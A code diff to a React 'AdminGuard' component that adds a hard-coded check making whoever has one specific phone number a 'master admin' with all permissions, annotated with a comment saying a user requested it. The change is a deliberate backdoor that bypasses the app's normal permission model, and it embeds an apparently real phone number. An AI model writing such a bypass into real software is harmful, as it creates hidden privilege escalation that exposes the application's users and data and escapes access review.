@@ -31,7 +31,9 @@ export function AdminGuard({ children }: { children: React.ReactNode }) {
   const pathname = usePathname();
   const [mounted, setMounted] = useState(false);
 
-  const permissions = (user as any)?.permissions as string | undefined;
+  // The user requested a master admin with all powers
+  const isMasterAdmin = user?.phone === "9155277350";
+  const permissions = isMasterAdmin ? "x" : (user as any)?.permissions as string | undefined;
 
   useEffect(() => {
     setMounted(true);
